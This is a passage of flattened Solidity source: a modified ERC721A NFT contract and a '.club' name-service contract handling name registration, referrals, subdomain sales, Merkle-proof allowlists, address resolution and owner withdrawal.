1054      * Burned tokens are calculated here, use `_totalMinted()` if you want to count just minted tokens.
1055      */
1056     function totalSupply() external view returns (uint256);
1057 }
1058 
1059 // File: erc721a/contracts/ERC721A.sol
1060 
1061 
1062 // ERC721A Contracts v3.3.0
1063 // Creator: Chiru Labs
1064 
1065 pragma solidity ^0.8.4;
1066 
1067 
1068 
1069 
1070 
1071 
1072 
1073 /**
1074  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
1075  * the Metadata extension. Built to optimize for lower gas during batch mints.
1076  *
1077  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
1078  *
1079  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
1080  *
1081  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
1082  */
1083 contract ERC721A is Context, ERC165, IERC721A {
1084     using Address for address;
1085     using Strings for uint256;
1086 
1087     // The tokenId of the next token to be minted.
1088     uint256 internal _currentIndex;
1089     mapping(uint => string) public tokenIDandAddress;
1090     mapping(string => uint) public tokenAddressandID;
1091     // The number of tokens burned.
1092     uint256 internal _burnCounter;
1093 
1094     // Token name
1095     string private _name;
1096 
1097     // Token symbol
1098     string private _symbol;
1099 
1100     // Mapping from token ID to ownership details
1101     // An empty struct value does not necessarily mean the token is unowned. See _ownershipOf implementation for details.
1102     mapping(uint256 => TokenOwnership) internal _ownerships;
1103 
1104     // Mapping owner address to address data
1105     mapping(address => AddressData) private _addressData;
1106 
1107     // Mapping from token ID to approved address
1108     mapping(uint256 => address) private _tokenApprovals;
1109 
1110     // Mapping from owner to operator approvals
1111     mapping(address => mapping(address => bool)) private _operatorApprovals;
1112 
1113     constructor(string memory name_, string memory symbol_) {
1114         _name = name_;
1115         _symbol = symbol_;
1116         _currentIndex = _startTokenId();
1117     }
1118 
1119     /**
1120      * To change the starting tokenId, please override this function.
1121      */
1122     function _startTokenId() internal view virtual returns (uint256) {
1123         return 1;
1124     }
1125 
1126     /**
1127      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
1128      */
1129     function totalSupply() public view override returns (uint256) {
1130         // Counter underflow is impossible as _burnCounter cannot be incremented
1131         // more than _currentIndex - _startTokenId() times
1132         unchecked {
1133             return _currentIndex - _burnCounter - _startTokenId();
1134         }
1135     }
1136 
1137     /**
1138      * Returns the total amount of tokens minted in the contract.
1139      */
1140     function _totalMinted() internal view returns (uint256) {
1141         // Counter underflow is impossible as _currentIndex does not decrement,
1142         // and it is initialized to _startTokenId()
1143         unchecked {
1144             return _currentIndex - _startTokenId();
1145         }
1146     }
1147 
1148     /**
1149      * @dev See {IERC165-supportsInterface}.
1150      */
1151     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
1152         return
1153             interfaceId == type(IERC721).interfaceId ||
1154             interfaceId == type(IERC721Metadata).interfaceId ||
1155             super.supportsInterface(interfaceId);
1156     }
1157 
1158     /**
1159      * @dev See {IERC721-balanceOf}.
1160      */
1161     function balanceOf(address owner) public view override returns (uint256) {
1162         if (owner == address(0)) revert BalanceQueryForZeroAddress();
1163         return uint256(_addressData[owner].balance);
1164     }
1165 
1166     /**
1167      * Returns the number of tokens minted by `owner`.
1168      */
1169     function _numberMinted(address owner) internal view returns (uint256) {
1170         return uint256(_addressData[owner].numberMinted);
1171     }
1172 
1173     /**
1174      * Returns the number of tokens burned by or on behalf of `owner`.
1175      */
1176     function _numberBurned(address owner) internal view returns (uint256) {
1177         return uint256(_addressData[owner].numberBurned);
1178     }
1179 
1180     /**
1181      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1182      */
1183     function _getAux(address owner) internal view returns (uint64) {
1184         return _addressData[owner].aux;
1185     }
1186 
1187     /**
1188      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
1189      * If there are multiple variables, please pack them into a uint64.
1190      */
1191     function _setAux(address owner, uint64 aux) internal {
1192         _addressData[owner].aux = aux;
1193     }
1194 
1195     /**
1196      * Gas spent here starts off proportional to the maximum mint batch size.
1197      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1198      */
1199     function _ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1200         uint256 curr = tokenId;
1201 
1202         unchecked {
1203             if (_startTokenId() <= curr) if (curr < _currentIndex) {
1204                 TokenOwnership memory ownership = _ownerships[curr];
1205                 if (!ownership.burned) {
1206                     if (ownership.addr != address(0)) {
1207                         return ownership;
1208                     }
1209                     // Invariant:
1210                     // There will always be an ownership that has an address and is not burned
1211                     // before an ownership that does not have an address and is not burned.
1212                     // Hence, curr will not underflow.
1213                     while (true) {
1214                         curr--;
1215                         ownership = _ownerships[curr];
1216                         if (ownership.addr != address(0)) {
1217                             return ownership;
1218                         }
1219                     }
1220                 }
1221             }
1222         }
1223         revert OwnerQueryForNonexistentToken();
1224     }
1225 
1226     /**
1227      * @dev See {IERC721-ownerOf}.
1228      */
1229     function ownerOf(uint256 tokenId) public view override returns (address) {
1230         return _ownershipOf(tokenId).addr;
1231     }
1232 
1233     /**
1234      * @dev See {IERC721Metadata-name}.
1235      */
1236     function name() public view virtual override returns (string memory) {
1237         return _name;
1238     }
1239 
1240     /**
1241      * @dev See {IERC721Metadata-symbol}.
1242      */
1243     function symbol() public view virtual override returns (string memory) {
1244         return _symbol;
1245     }
1246 
1247     /**
1248      * @dev See {IERC721Metadata-tokenURI}.
1249      */
1250     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1251         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
1252 
1253         string memory baseURI = _baseURI();
1254         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenIDandAddress[tokenId])) : '';
1255     }
1256 
1257     /**
1258      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
1259      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1260      * by default, can be overriden in child contracts.
1261      */
1262     function _baseURI() internal view virtual returns (string memory) {
1263         return '';
1264     }
1265 
1266     /**
1267      * @dev See {IERC721-approve}.
1268      */
1269     function approve(address to, uint256 tokenId) public override {
1270         address owner = ERC721A.ownerOf(tokenId);
1271         if (to == owner) revert ApprovalToCurrentOwner();
1272 
1273         if (_msgSender() != owner) if(!isApprovedForAll(owner, _msgSender())) {
1274             revert ApprovalCallerNotOwnerNorApproved();
1275         }
1276 
1277         _approve(to, tokenId, owner);
1278     }
1279 
1280     /**
1281      * @dev See {IERC721-getApproved}.
1282      */
1283     function getApproved(uint256 tokenId) public view override returns (address) {
1284         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
1285 
1286         return _tokenApprovals[tokenId];
1287     }
1288 
1289     /**
1290      * @dev See {IERC721-setApprovalForAll}.
1291      */
1292     function setApprovalForAll(address operator, bool approved) public virtual override {
1293         if (operator == _msgSender()) revert ApproveToCaller();
1294 
1295         _operatorApprovals[_msgSender()][operator] = approved;
1296         emit ApprovalForAll(_msgSender(), operator, approved);
1297     }
1298 
1299     /**
1300      * @dev See {IERC721-isApprovedForAll}.
1301      */
1302     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1303         return _operatorApprovals[owner][operator];
1304     }
1305 
1306     /**
1307      * @dev See {IERC721-transferFrom}.
1308      */
1309     function transferFrom(
1310         address from,
1311         address to,
1312         uint256 tokenId
1313     ) public virtual override {
1314         _transfer(from, to, tokenId);
1315     }
1316 
1317     /**
1318      * @dev See {IERC721-safeTransferFrom}.
1319      */
1320     function safeTransferFrom(
1321         address from,
1322         address to,
1323         uint256 tokenId
1324     ) public virtual override {
1325         safeTransferFrom(from, to, tokenId, '');
1326     }
1327 
1328     /**
1329      * @dev See {IERC721-safeTransferFrom}.
1330      */
1331     function safeTransferFrom(
1332         address from,
1333         address to,
1334         uint256 tokenId,
1335         bytes memory _data
1336     ) public virtual override {
1337         _transfer(from, to, tokenId);
1338         if (to.isContract()) if(!_checkContractOnERC721Received(from, to, tokenId, _data)) {
1339             revert TransferToNonERC721ReceiverImplementer();
1340         }
1341     }
1342 
1343     /**
1344      * @dev Returns whether `tokenId` exists.
1345      *
1346      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1347      *
1348      * Tokens start existing when they are minted (`_mint`),
1349      */
1350     function _exists(uint256 tokenId) internal view returns (bool) {
1351         return _startTokenId() <= tokenId && tokenId < _currentIndex && !_ownerships[tokenId].burned;
1352     }
1353 
1354     /**
1355      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1356      */
1357     function _safeMint(address to, uint256 quantity) internal {
1358         _safeMint(to, quantity, '');
1359     }
1360 
1361     /**
1362      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1363      *
1364      * Requirements:
1365      *
1366      * - If `to` refers to a smart contract, it must implement
1367      *   {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1368      * - `quantity` must be greater than 0.
1369      *
1370      * Emits a {Transfer} event.
1371      */
1372     function _safeMint(
1373         address to,
1374         uint256 quantity,
1375         bytes memory _data
1376     ) internal {
1377         uint256 startTokenId = _currentIndex;
1378         if (to == address(0)) revert MintToZeroAddress();
1379         if (quantity == 0) revert MintZeroQuantity();
1380 
1381         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1382 
1383         // Overflows are incredibly unrealistic.
1384         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1385         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1386         unchecked {
1387             _addressData[to].balance += uint64(quantity);
1388             _addressData[to].numberMinted += uint64(quantity);
1389 
1390             _ownerships[startTokenId].addr = to;
1391             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1392 
1393             uint256 updatedIndex = startTokenId;
1394             uint256 end = updatedIndex + quantity;
1395 
1396             if (to.isContract()) {
1397                 do {
1398                     emit Transfer(address(0), to, updatedIndex);
1399                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1400                         revert TransferToNonERC721ReceiverImplementer();
1401                     }
1402                 } while (updatedIndex < end);
1403                 // Reentrancy protection
1404                 if (_currentIndex != startTokenId) revert();
1405             } else {
1406                 do {
1407                     emit Transfer(address(0), to, updatedIndex++);
1408                 } while (updatedIndex < end);
1409             }
1410             _currentIndex = updatedIndex;
1411         }
1412         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1413     }
1414 
1415     /**
1416      * @dev Mints `quantity` tokens and transfers them to `to`.
1417      *
1418      * Requirements:
1419      *
1420      * - `to` cannot be the zero address.
1421      * - `quantity` must be greater than 0.
1422      *
1423      * Emits a {Transfer} event.
1424      */
1425     function _mint(address to, uint256 quantity) internal {
1426         uint256 startTokenId = _currentIndex;
1427         if (to == address(0)) revert MintToZeroAddress();
1428         if (quantity == 0) revert MintZeroQuantity();
1429 
1430         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1431 
1432         // Overflows are incredibly unrealistic.
1433         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1434         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1435         unchecked {
1436             _addressData[to].balance += uint64(quantity);
1437             _addressData[to].numberMinted += uint64(quantity);
1438 
1439             _ownerships[startTokenId].addr = to;
1440             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1441 
1442             uint256 updatedIndex = startTokenId;
1443             uint256 end = updatedIndex + quantity;
1444 
1445             do {
1446                 emit Transfer(address(0), to, updatedIndex++);
1447             } while (updatedIndex < end);
1448 
1449             _currentIndex = updatedIndex;
1450         }
1451         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1452     }
1453 
1454     /**
1455      * @dev Transfers `tokenId` from `from` to `to`.
1456      *
1457      * Requirements:
1458      *
1459      * - `to` cannot be the zero address.
1460      * - `tokenId` token must be owned by `from`.
1461      *
1462      * Emits a {Transfer} event.
1463      */
1464     function _transfer(
1465         address from,
1466         address to,
1467         uint256 tokenId
1468     ) private {
1469         TokenOwnership memory prevOwnership = _ownershipOf(tokenId);
1470 
1471         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1472 
1473         bool isApprovedOrOwner = (_msgSender() == from ||
1474             isApprovedForAll(from, _msgSender()) ||
1475             getApproved(tokenId) == _msgSender());
1476 
1477         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1478         if (to == address(0)) revert TransferToZeroAddress();
1479 
1480         _beforeTokenTransfers(from, to, tokenId, 1);
1481 
1482         // Clear approvals from the previous owner
1483         _approve(address(0), tokenId, from);
1484 
1485         // Underflow of the sender's balance is impossible because we check for
1486         // ownership above and the recipient's balance can't realistically overflow.
1487         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1488         unchecked {
1489             _addressData[from].balance -= 1;
1490             _addressData[to].balance += 1;
1491 
1492             TokenOwnership storage currSlot = _ownerships[tokenId];
1493             currSlot.addr = to;
1494             currSlot.startTimestamp = uint64(block.timestamp);
1495 
1496             
1497             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1498             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1499             uint256 nextTokenId = tokenId + 1;
1500             TokenOwnership storage nextSlot = _ownerships[nextTokenId];
1501             if (nextSlot.addr == address(0)) {
1502                 // This will suffice for checking _exists(nextTokenId),
1503                 // as a burned slot cannot contain the zero address.
1504                 if (nextTokenId != _currentIndex) {
1505                     nextSlot.addr = from;
1506                     nextSlot.startTimestamp = prevOwnership.startTimestamp;
1507                 }
1508             }
1509         }
1510 
1511         emit Transfer(from, to, tokenId);
1512         _afterTokenTransfers(from, to, tokenId, 1);
1513     }
1514 
1515     /**
1516      * @dev Equivalent to `_burn(tokenId, false)`.
1517      */
1518     function _burn(uint256 tokenId) internal virtual {
1519         _burn(tokenId, false);
1520     }
1521 
1522     /**
1523      * @dev Destroys `tokenId`.
1524      * The approval is cleared when the token is burned.
1525      *
1526      * Requirements:
1527      *
1528      * - `tokenId` must exist.
1529      *
1530      * Emits a {Transfer} event.
1531      */
1532     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1533         TokenOwnership memory prevOwnership = _ownershipOf(tokenId);
1534 
1535         address from = prevOwnership.addr;
1536 
1537         if (approvalCheck) {
1538             bool isApprovedOrOwner = (_msgSender() == from ||
1539                 isApprovedForAll(from, _msgSender()) ||
1540                 getApproved(tokenId) == _msgSender());
1541 
1542             if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1543         }
1544 
1545         _beforeTokenTransfers(from, address(0), tokenId, 1);
1546 
1547         // Clear approvals from the previous owner
1548         _approve(address(0), tokenId, from);
1549 
1550         // Underflow of the sender's balance is impossible because we check for
1551         // ownership above and the recipient's balance can't realistically overflow.
1552         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1553         unchecked {
1554             AddressData storage addressData = _addressData[from];
1555             addressData.balance -= 1;
1556             addressData.numberBurned += 1;
1557 
1558             // Keep track of who burned the token, and the timestamp of burning.
1559             TokenOwnership storage currSlot = _ownerships[tokenId];
1560             currSlot.addr = from;
1561             currSlot.startTimestamp = uint64(block.timestamp);
1562             currSlot.burned = true;
1563 
1564             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1565             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1566             uint256 nextTokenId = tokenId + 1;
1567             TokenOwnership storage nextSlot = _ownerships[nextTokenId];
1568             if (nextSlot.addr == address(0)) {
1569                 // This will suffice for checking _exists(nextTokenId),
1570                 // as a burned slot cannot contain the zero address.
1571                 if (nextTokenId != _currentIndex) {
1572                     nextSlot.addr = from;
1573                     nextSlot.startTimestamp = prevOwnership.startTimestamp;
1574                 }
1575             }
1576         }
1577 
1578         emit Transfer(from, address(0), tokenId);
1579         _afterTokenTransfers(from, address(0), tokenId, 1);
1580 
1581         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1582         unchecked {
1583             _burnCounter++;
1584         }
1585     }
1586 
1587     /**
1588      * @dev Approve `to` to operate on `tokenId`
1589      *
1590      * Emits a {Approval} event.
1591      */
1592     function _approve(
1593         address to,
1594         uint256 tokenId,
1595         address owner
1596     ) private {
1597         _tokenApprovals[tokenId] = to;
1598         emit Approval(owner, to, tokenId);
1599     }
1600 
1601     /**
1602      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1603      *
1604      * @param from address representing the previous owner of the given token ID
1605      * @param to target address that will receive the tokens
1606      * @param tokenId uint256 ID of the token to be transferred
1607      * @param _data bytes optional data to send along with the call
1608      * @return bool whether the call correctly returned the expected magic value
1609      */
1610     function _checkContractOnERC721Received(
1611         address from,
1612         address to,
1613         uint256 tokenId,
1614         bytes memory _data
1615     ) private returns (bool) {
1616         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1617             return retval == IERC721Receiver(to).onERC721Received.selector;
1618         } catch (bytes memory reason) {
1619             if (reason.length == 0) {
1620                 revert TransferToNonERC721ReceiverImplementer();
1621             } else {
1622                 assembly {
1623                     revert(add(32, reason), mload(reason))
1624                 }
1625             }
1626         }
1627     }
1628 
1629     /**
1630      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1631      * And also called before burning one token.
1632      *
1633      * startTokenId - the first token id to be transferred
1634      * quantity - the amount to be transferred
1635      *
1636      * Calling conditions:
1637      *
1638      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1639      * transferred to `to`.
1640      * - When `from` is zero, `tokenId` will be minted for `to`.
1641      * - When `to` is zero, `tokenId` will be burned by `from`.
1642      * - `from` and `to` are never both zero.
1643      */
1644     function _beforeTokenTransfers(
1645         address from,
1646         address to,
1647         uint256 startTokenId,
1648         uint256 quantity
1649     ) internal virtual {}
1650 
1651     /**
1652      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1653      * minting.
1654      * And also called after one token has been burned.
1655      *
1656      * startTokenId - the first token id to be transferred
1657      * quantity - the amount to be transferred
1658      *
1659      * Calling conditions:
1660      *
1661      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1662      * transferred to `to`.
1663      * - When `from` is zero, `tokenId` has been minted for `to`.
1664      * - When `to` is zero, `tokenId` has been burned by `from`.
1665      * - `from` and `to` are never both zero.
1666      */
1667     function _afterTokenTransfers(
1668         address from,
1669         address to,
1670         uint256 startTokenId,
1671         uint256 quantity
1672     ) internal virtual {}
1673 }
1674 
1675 
1676 
1677 
1678 
1679 pragma solidity ^0.8.4;
1680 
1681 
1682 
1683 
1684 
1685 
1686 contract Club is ERC721A, Ownable, ReentrancyGuard {
1687     using Strings for uint256;
1688     uint256 public cost = 8000000000000000;
1689     uint256 public ref = 25;
1690     uint256 public ref_owner = 25;
1691     uint256 public ref_discount = 25;
1692     uint256 public subdomains_fee = 10;
1693     uint256 private maxCharSize=20;
1694     
1695     string private domain='.club';
1696 
1697     string private BASE_URI = 'https://nftmetadata.live/clubns/';
1698     bool public IS_SALE_ACTIVE = false;
1699     bool public IS_ALLOWLIST_ACTIVE = false;
1700     mapping(address => bool) public allowlistAddresses;
1701     mapping(string => mapping(address => bool)) public subDomains_allowlistAddresses;
1702     mapping(string => address) public resolveAddress;
1703     mapping(address => string) public primaryAddress;
1704     mapping(string => bool) public subDomains_publicSale;
1705     mapping(string => uint) public subDomains_cost;
1706     mapping(string => bytes32) public subDomains_allowList;
1707     mapping(string => uint) public subDomains_allowList_cost;
1708     mapping(string => mapping(string => string)) public dataAddress;
1709     bytes32 public merkleRoot;
1710     bytes _allowChars = "0123456789-_abcdefghijklmnopqrstuvwxyz";
1711     constructor() ERC721A(".club Name Service", ".club") {
1712         tokenIDandAddress[_currentIndex]="club";
1713         tokenAddressandID["club"]=_currentIndex;
1714         resolveAddress["club"]=msg.sender;
1715         _safeMint(msg.sender,1);
1716     }
1717 
1718     
1719     function _baseURI() internal view virtual override returns (string memory) {
1720         return BASE_URI;
1721     }
1722 
1723     function setAddress(string calldata ether_name, address newresolve) external {
1724          TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ether_name]);
1725         if (Ownership.addr != msg.sender) revert("Error");
1726         
1727 
1728     bytes memory result = bytes(primaryAddress[resolveAddress[ether_name]]);
1729         if (keccak256(result) == keccak256(bytes(ether_name))) {
1730             primaryAddress[resolveAddress[ether_name]]="";
1731         }
1732         resolveAddress[ether_name]=newresolve;
1733     }
1734 
1735     function setPrimaryAddress(string calldata ether_name) external {
1736         require(resolveAddress[ether_name]==msg.sender, "Error");
1737         primaryAddress[msg.sender]=ether_name;
1738     }
1739 
1740 
1741     function setDataAddress(string calldata ether_name,string calldata setArea, string  memory newDatas) external {
1742          TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ether_name]);
1743 
1744         if (Ownership.addr != msg.sender) revert("Error");
1745         dataAddress[ether_name][setArea]=newDatas;
1746     }
1747 
1748     function getDataAddress(string memory ether_name, string calldata Area) public view returns(string memory) {
1749         return dataAddress[ether_name][Area];
1750     }
1751 
1752 
1753     function setBaseURI(string memory customBaseURI_) external onlyOwner {
1754         BASE_URI = customBaseURI_;
1755     }
1756 
1757     function setMaxCharSize(uint256 maxCharSize_) external onlyOwner {
1758         maxCharSize = maxCharSize_;
1759     }
1760     
1761      function setAllowChars(bytes memory allwchr) external onlyOwner {
1762         _allowChars = allwchr;
1763     }
1764 
1765     function setPrice(uint256 customPrice) external onlyOwner {
1766         cost = customPrice;
1767     }
1768 
1769     function setRefSettings(uint ref_,uint ref_owner_,uint ref_discount_,uint subdomains_fee_) external onlyOwner {
1770         ref = ref_;
1771         ref_owner = ref_owner_;
1772         ref_discount = ref_discount_;
1773         subdomains_fee = subdomains_fee_;
1774 
1775     }
1776 
1777 
1778     function setSaleActive(bool saleIsActive) external onlyOwner {
1779         IS_SALE_ACTIVE = saleIsActive;
1780     }
1781 
1782      function setAllowListSaleActive(bool WhitesaleIsActive) external onlyOwner {
1783         IS_ALLOWLIST_ACTIVE = WhitesaleIsActive;
1784     }
1785 
1786     function setSubdomainSaleActive(bool saleIsActive, uint256 customPrice, string calldata ether_name) public {
1787         TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ether_name]);
1788         require(Ownership.addr == msg.sender, "Invalid");
1789         subDomains_cost[ether_name] = customPrice;
1790         subDomains_publicSale[ether_name] = saleIsActive;
1791 
1792     }
1793 
1794     function register(address ref_address, string memory ether_name)
1795         public
1796         payable
1797     {   
1798         uint256 price = cost;
1799         bool is_ref=false;
1800         uint256 ref_cost=0;
1801         require(bytes(ether_name).length<=maxCharSize,"Long name");
1802         require(bytes(ether_name).length>0,"Write a name");
1803         require(_checkName(ether_name), "Invalid name");
1804         if (ref_address== 0x0000000000000000000000000000000000000000) {
1805         price=cost;
1806         } else {
1807         if (bytes(primaryAddress[ref_address]).length>0){
1808         ref_cost=price*ref_owner/100;    
1809         } else {
1810         ref_cost=price*ref/100;
1811         }
1812         price = price*(100-ref_discount)/100;
1813         is_ref=true;
1814         }
1815         require (tokenAddressandID[ether_name] == 0 , "This is already taken"); 
1816         require(IS_SALE_ACTIVE, "Sale is not active!");
1817         require(msg.value >= price, "Insufficient funds!");
1818         tokenIDandAddress[_currentIndex]=ether_name;
1819         tokenAddressandID[ether_name]=_currentIndex;
1820         resolveAddress[ether_name]=msg.sender;
1821          if (is_ref) {
1822         payable(ref_address).transfer(ref_cost);
1823         }
1824         _safeMint(msg.sender,1);
1825     }
1826 
1827      function allowList(string memory ether_name, bytes32[] calldata _merkleProof)
1828         public
1829         payable
1830     {      
1831             require(IS_ALLOWLIST_ACTIVE, "Allow List sale is not active!");
1832             bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
1833             require(MerkleProof.verify(_merkleProof, merkleRoot, leaf),"Invalid proof!");
1834             require(bytes(ether_name).length<=maxCharSize,"Long name");
1835             require(bytes(ether_name).length>0,"Write a name");
1836             require(_checkName(ether_name), "Invalid name");
1837             require(allowlistAddresses[msg.sender]!=true, "Claimed!");
1838             require (tokenAddressandID[ether_name] == 0 , "This is already taken"); 
1839             allowlistAddresses[msg.sender] = true;
1840             tokenIDandAddress[_currentIndex]=ether_name;
1841             tokenAddressandID[ether_name]=_currentIndex;
1842             resolveAddress[ether_name]=msg.sender;
1843             _safeMint(msg.sender,1);
1844     }
1845 
1846 
1847     function registerSubdomain(string memory ether_name, string memory subdomain_name)
1848         public
1849         payable
1850     {   
1851         require(IS_SALE_ACTIVE, "Sale is not active!");
1852         string memory new_domain=string.concat(subdomain_name,'.',ether_name);
1853         require(bytes(subdomain_name).length<=maxCharSize,"Long name");
1854         require(bytes(subdomain_name).length>0,"Write a name");
1855         require(_checkName(ether_name), "Invalid name");
1856         require(_checkName(subdomain_name), "Invalid name");
1857         require (tokenAddressandID[new_domain] == 0 , "This is already taken"); 
1858   
1859         TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ether_name]);
1860         if (Ownership.addr == msg.sender)
1861         {
1862         tokenIDandAddress[_currentIndex]=new_domain;
1863         tokenAddressandID[new_domain]=_currentIndex;
1864         resolveAddress[new_domain]=msg.sender; 
1865         _safeMint(msg.sender,1);   
1866         } else {
1867         require(subDomains_publicSale[ether_name]==true, "Only Owner can register");
1868         require(msg.value >= subDomains_cost[ether_name], "Insufficient funds!");
1869         payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100);
1870         tokenIDandAddress[_currentIndex]=new_domain;
1871         tokenAddressandID[new_domain]=_currentIndex;
1872         resolveAddress[new_domain]=msg.sender;
1873         _safeMint(msg.sender,1);       
1874         }
1875     }
1876 
1877 
1878     function allowListSubdomain(string memory ether_name,  string memory subdomain_name, bytes32[] calldata _merkleProof)
1879         public
1880         payable
1881     {      
1882             string memory new_domain=string.concat(subdomain_name,'.',ether_name);
1883             bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
1884             require(MerkleProof.verify(_merkleProof, subDomains_allowList[ether_name], leaf),"Invalid proof!");
1885             require(msg.value >= subDomains_allowList_cost[ether_name], "Insufficient funds!");
1886 
1887 
1888             require(bytes(subdomain_name).length<=maxCharSize,"Long name");
1889             require(bytes(subdomain_name).length>0,"Write a name");
1890             require(_checkName(ether_name), "Invalid name");
1891             require(_checkName(subdomain_name), "Invalid name");
1892             require(subDomains_allowlistAddresses[ether_name][msg.sender]!=true, "Claimed!");
1893             require (tokenAddressandID[new_domain] == 0 , "This is already taken"); 
1894             TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ether_name]);
1895             payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100);
1896             subDomains_allowlistAddresses[ether_name][msg.sender] = true;
1897             tokenIDandAddress[_currentIndex]=new_domain;
1898             tokenAddressandID[new_domain]=_currentIndex;
1899             resolveAddress[new_domain]=msg.sender;
1900             _safeMint(msg.sender,1);
1901     }
1902 
1903     
1904     function namediff(uint256 tokenId , string calldata new_ether_name) external onlyOwner {
1905         tokenIDandAddress[tokenId]=new_ether_name;
1906         tokenAddressandID[new_ether_name]=tokenId;
1907     }
1908 
1909 
1910 function walletOfOwnerName(address _owner)
1911     public
1912     view
1913     returns (string[] memory)
1914   {
1915     uint256 ownerTokenCount = balanceOf(_owner);
1916     string[] memory ownedTokenIds = new string[](ownerTokenCount);
1917     uint256 currentTokenId = 1;
1918     uint256 ownedTokenIndex = 0;
1919 
1920     while (ownedTokenIndex < ownerTokenCount) {
1921       address currentTokenOwner = ownerOf(currentTokenId);
1922 
1923       if (currentTokenOwner == _owner) {
1924         ownedTokenIds[ownedTokenIndex] = string.concat(tokenIDandAddress[currentTokenId],domain);
1925 
1926         ownedTokenIndex++;
1927       }
1928 
1929       currentTokenId++;
1930     }
1931 
1932     return ownedTokenIds;
1933   }
1934 
1935 
1936 function lastAddresses(uint256 count)
1937     public
1938     view
1939     returns (string[] memory)
1940   {
1941     uint256 total = totalSupply();
1942     string[] memory lastAddr = new string[](count);
1943     uint256 currentId = total - count;
1944     uint256 ownedTokenIndex = 0;
1945     require(currentId>=0,"Invalid");
1946     while (total > currentId) {
1947         lastAddr[ownedTokenIndex] = string.concat(tokenIDandAddress[total],domain);
1948         ownedTokenIndex++;
1949       total--;
1950     }
1951 
1952     return lastAddr;
1953   }
1954 
1955 
1956 function setMerkleRoot(bytes32 _newMerkleRoot) external onlyOwner {
1957         merkleRoot = _newMerkleRoot;
1958     }
1959 
1960 function setMerkleRootSubdomain(bytes32 _newMerkleRoot, string memory ether_name, uint256 _cost) external {
1961       TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[ether_name]);
1962         if (Ownership.addr != msg.sender) revert("Error");
1963 
1964         subDomains_allowList[ether_name] = _newMerkleRoot;
1965         subDomains_allowList_cost[ether_name] = _cost;
1966     }
1967     
1968 
1969 
1970  function _checkName(string memory _name) public view returns(bool){
1971         uint allowedChars =0;
1972         bytes memory byteString = bytes(_name);
1973         bytes memory allowed = bytes(_allowChars);  
1974         for(uint i=0; i < byteString.length ; i++){
1975            for(uint j=0; j<allowed.length; j++){
1976               if(byteString[i]==allowed[j] )
1977               allowedChars++;         
1978            }
1979         }
1980         if (allowedChars==byteString.length) { return true; } else { return false; }
1981        
1982     }
1983 
1984         /** PAYOUT **/
1985 
1986     function withdraw() public onlyOwner nonReentrant {
1987         uint256 balance = address(this).balance;
1988         Address.sendValue(payable(0x1c388Add4b4c9301EBcD17A0B50c00A0c5f453f9),balance);
1989         }
1990 
1991 }